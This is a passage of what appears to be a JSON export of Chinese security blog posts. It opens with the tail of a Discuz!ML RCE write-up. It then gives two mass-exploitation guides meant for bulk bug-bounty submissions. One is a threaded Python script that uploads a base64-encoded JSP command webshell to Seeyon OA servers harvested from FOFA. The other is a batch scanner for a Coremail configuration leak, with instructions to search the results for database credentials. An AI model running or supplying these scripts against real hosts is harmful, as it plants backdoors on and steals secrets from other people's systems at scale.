最后将$template写入到缓存文件，也就是上面说的那个目录下 终于被include包含执行 总结：language可控，传给language可控，传给language可控，传给template，生成缓存文件后，又被include_once包含，造成RCE s5. 修复 至文章编辑日2019年7月16日并无官方补丁 关注：https://bitbucket.org/vot/discuz.ml/commits/all等待补丁 PS：因博客重建，特意将本人文章从Tools转移回来，如有影响，可联系删帖 文章链接（来点个顶可好~）：https://www.t00ls.net/thread-51968-1-1.html ","link":"https://www.svenbeast.com/post/discuzml33-lou-dong-fu-xian-ji-fen-xi-fu-poc/"},{"title":"致远OA批量getshell刷SRC","content":"步骤1：利用fofa搜索目标，然后保存成1.html网页到fofa.py同一路径下 usage：ctrl+s 步骤2：用fofa.py 导出域名和ip，因为fofa的导出和api都要RMB，脚本写的不好，见谅了，但胜在比手动快一些 -.- ! usage：python2 fofa.py #coding=utf-8 #python2 #By sven'beast import sys import requests from lxml import etree # def check_url(url): with open('1.html','r') as f: text=f.read() html = etree.HTML(text) results = html.xpath('//*[@id=&quot;ajax_content&quot;]/div/div/div/a') results2 = html.xpath(&quot;//div[@class='ip-no-url']//text()&quot;) with open('url.txt','a') as s: for i in results: print i.get('href').split('/')[2] url=i.get('href').split('/')[2] s.write('http://'+url) s.write('\\n') with open('url.txt','a') as s: for i in results2: ip='http://'+i.strip() print(ip) s.write(ip) s.write('\\n') 步骤3：用poc.py检测一下，生成success.txt，这里注意的是，会直接写入cmd马，敏感目标请自己注意。 ps：这个脚本弄了很长时间，没办法，菜~，requests.post这里总是报错，抓狂，也没人可以问 -.- ! usage：python3 poc.py #!/usr/bin/env python3 #-*- encoding:utf-8 -*- #By sven'beast import base64 import requests import threading import queue q=queue.Queue() file=open('url.txt') for x in file.readlines(): q.put(x.strip()) def scan(): while not q.empty(): url=q.get() headers={'Content-Type':'text/xml','User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:52.0) Gecko/20100101 Firefox/52.'} post_payload1=&quot;REJTVEVQIFYzLjAgICAgIDM1NSAgICAgICAgICAgICAwICAgICAgICAgICAgICAgNjY2ICAgICAgICAgICAgIERCU1RFUD1PS01MbEtsVg0KT1BUSU9OPVMzV1lPU1dMQlNHcg0KY3VycmVudFVzZXJJZD16VUNUd2lnc3ppQ0FQTGVzdzRnc3c0b0V3VjY2DQpDUkVBVEVEQVRFPXdVZ2hQQjNzekIzWHdnNjYNClJFQ09SRElEPXFMU0d3NFNYekxlR3c0VjN3VXczelVvWHdpZDYNCm9yaWdpbmFsRmlsZUlkPXdWNjYNCm9yaWdpbmFsQ3JlYXRlRGF0ZT13VWdoUEIzc3pCM1h3ZzY2DQpGSUxFTkFNRT1xZlRkcWZUZHFmVGRWYXhKZUFKUUJSbDNkRXhReVlPZE5BbGZlYXhzZEdoaXlZbFRjQVRkTjFsaU40S1h3aVZHemZUMmRFZzYNCm5lZWRSZWFkRmlsZT15UldaZEFTNg0Kb3JpZ2luYWxDcmVhdGVEYXRlPXdMU0dQNG9FekxLQXo0PWl6PTY2DQo8JUAgcGFnZSBsYW5ndWFnZT0iamF2YSIgaW1wb3J0PSJqYXZhLnV0aWwuKixqYXZhLmlvLioiIHBhZ2VFbmNvZGluZz0iVVRGLTgiJT48JSFwdWJsaWMgc3RhdGljIFN0cmluZyBleGN1dGVDbWQoU3RyaW5nIGMpIHtTdHJpbmdCdWlsZGVyIGxpbmUgPSBuZXcgU3RyaW5nQnVpbGRlcigpO3RyeSB7UHJvY2VzcyBwcm8gPSBSdW50aW1lLmdldFJ1bnRpbWUoKS5leGVjKGMpO0J1ZmZlcmVkUmVhZGVyIGJ1ZiA9IG5ldyBCdWZmZXJlZFJlYWRlcihuZXcgSW5wdXRTdHJlYW1SZWFkZXIocHJvLmdldElucHV0U3RyZWFtKCkpKTtTdHJpbmcgdGVtcCA9IG51bGw7d2hpbGUgKCh0ZW1wID0gYnVmLnJlYWRMaW5lKCkpICE9IG51bGwpIHtsaW5lLmFwcGVuZCh0ZW1wKyJcbiIpO31idWYuY2xvc2UoKTt9IGNhdGNoIChFeGNlcHRpb24gZSkge2xpbmUuYXBwZW5kKGUuZ2V0TWVzc2FnZSgpKTt9cmV0dXJuIGxpbmUudG9TdHJpbmcoKTt9ICU+PCVpZigiYXNhc2QzMzQ0NSIuZXF1YWxzKHJlcXVlc3QuZ2V0UGFyYW1ldGVyKCJwd2QiKSkmJiEiIi5lcXVhbHMocmVxdWVzdC5nZXRQYXJhbWV0ZXIoImNtZCIpKSl7b3V0LnByaW50bG4oIjxwcmU+IitleGN1dGVDbWQocmVxdWVzdC5nZXRQYXJhbWV0ZXIoImNtZCIpKSArICI8L3ByZT4iKTt9ZWxzZXtvdXQucHJpbnRsbigiOi0pIik7fSU+NmU0ZjA0NWQ0Yjg1MDZiZjQ5MmFkYTdlMzM5MGQ3Y2U=&quot; post_payload1 = base64.b64decode(post_payload1) requests.packages.urllib3.disable_warnings() try: post=requests.post(url=url+'/seeyon/htmlofficeservlet',data=post_payload1,headers=headers,verify=False,timeout=10) r = requests.get(url=url+'/seeyon/test123456.jsp?pwd=asasd3344&amp;cmd=cmd+/c+echo%20unsafe',headers=headers,timeout=10,verify=False) if 'unsafe' in r.text: print ('Getshell Success:'+url+'/seeyon/test123456.jsp?pwd=asasd3344&amp;cmd=cmd+/c+echo%20unsafe'+'\\n') with open('success.txt','a') as f: f.write(url+'/seeyon/test123456.jsp?pwd=asasd3344&amp;cmd=cmd+/c+echo%20unsafe'+'\\n') else: print ('Getshell fail:'+url+'\\n') except: print ('Getshell fail:'+url+ ' time out.'+'\\n') th=[] th_num=10 for x in range(th_num): t=threading.Thread(target=scan) th.append(t) for x in range(th_num): th[x].start() for x in range(th_num): th[x].join() 步骤4：打开success.txt复制链接去执行命令吧，提交SRC，当然我肯定抢不过各位大佬的。 代码已经提供了，可以自己复制，同时也分享了百度云和附件 链接: https://pan.baidu.com/s/1xfcxfk16PanOtjUBJmKdxQ 提取码: xrrq 解压密码：svenbeast PS：因博客重建，特意将本人文章从Tools转移回来，如有影响，可联系删帖 文章链接（来点个顶可好~）：https://www.t00ls.net/thread-51610-1-1.html ","link":"https://www.svenbeast.com/post/zhi-yuan-oa-pi-liang-getshell-shua-src/"},{"title":"coremail批量刷src","content":" 用来小批量刷src的洞是hw这几天曝出的coremail的信息泄露漏洞，量级够，所以可堪一战 在此对写coremail的POC的作者表示感谢la -.-! 首先步骤1：利用google语法列出搜索结果并保存网页# 这里图片里的google语法是 inurl:coremail（其他语法需自行构造，最好加上中文关键字），然后翻到第2页，ctrl+s将页面保存为1.html ps：拥有ZoomEye，Fofa，shodan账号的略过即可 -.- 步骤2：获取html文件中的coremaile域名# usage：python2 damain.py #coding=utf-8 import sys import requests from lxml import etree # def check_url(url): with open('1.html','r') as f: text=f.read() html = etree.HTML(text) results = html.xpath('//*[@id=&quot;rso&quot;]/div[1]/div/div/div/div/div/a') with open('ip.txt','a') as s: for i in results: print i.get('href').split('/')[2] url=i.get('href').split('/')[2] s.write('http://'+url) s.write('\\n') 会在当前目录下生成ip.txt Ps：记得把生成的ip.txt文件中google.com后缀的网站删掉，这个是google翻译，不删掉有些浪费检测时间，毕竟是单线程，hh。 步骤3：批量验证漏洞# usage：python2 poc.py #-*- Coding: utf-8 -*- import requests,sys def mailsmsPoC(url): url = url + &quot;/mailsms/s?func=ADMIN:appState&amp;dumpConfig=/&quot; try: r = requests.get(url,timeout=8000) if (r.status_code != '404') and (&quot;/home/coremail&quot; in r.text): print &quot;mailsms is vulnerable: {0}&quot;.format(url) with open('vul.txt', 'a') as f: f.write(url + '\\n') else: print &quot;mailsms is safe!&quot; except Exception as e: print &quot;######time out######&quot; if __name__ == '__main__': try: mailsmsPoC(sys.argv[1]) except: print &quot;python poc.py&quot; file = open('ip.txt', 'r') for f in file.readlines(): url = f.strip('\\r\\n') mailsmsPoC(url) 步骤4：存在漏洞的会在当前目录下生成vul.txt，直接复制url粘贴到网页上，ctr+f搜索database就可以看到数据库的账号密码一些信息了,就可以开始截图进行src提交了# 结束：获取域名时，后得到的域名是编辑进ip.txt文件的，所以不必担心多次获取域名后替换前面已获取的。 PS：因博客重建，特意将本人文章从圈子转移回来，如有影响，可联系删帖 文章链接（来点个顶可好~）：https://www.secquan.org/Discuss/1069678 ","link":"https://www.svenbeast.com/post/coremail-pi-liang-shua-src/"}]}